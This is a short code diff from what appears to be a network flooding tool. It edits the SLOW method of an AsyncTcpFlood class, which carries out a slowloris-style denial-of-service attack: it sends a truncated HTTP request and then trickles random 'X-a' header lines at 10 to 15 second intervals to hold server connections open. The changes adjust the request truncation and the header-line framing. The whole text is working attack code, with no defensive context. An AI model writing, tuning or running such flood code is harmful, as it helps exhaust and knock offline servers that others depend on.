@@ -468,13 +468,13 @@ class AsyncTcpFlood(FloodBase):
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
 
     async def SLOW(self, on_connect=None) -> bool:
-        packet: bytes = self.build_request()[:-2]
+        packet: bytes = self.build_request()[:-3]
 
         def _gen():
             yield FloodOp.WRITE, packet
 
             for _ in range(self._settings.requests_per_connection):
-                keep_alive = b"X-a: %d\r\n" % random.randint(1, 1000000)
+                keep_alive = b"\nX-a: %d\r" % random.randint(1, 1000000)
                 yield FloodOp.WRITE, keep_alive
                 yield FloodOp.SLEEP, random.randint(10, 15)
 
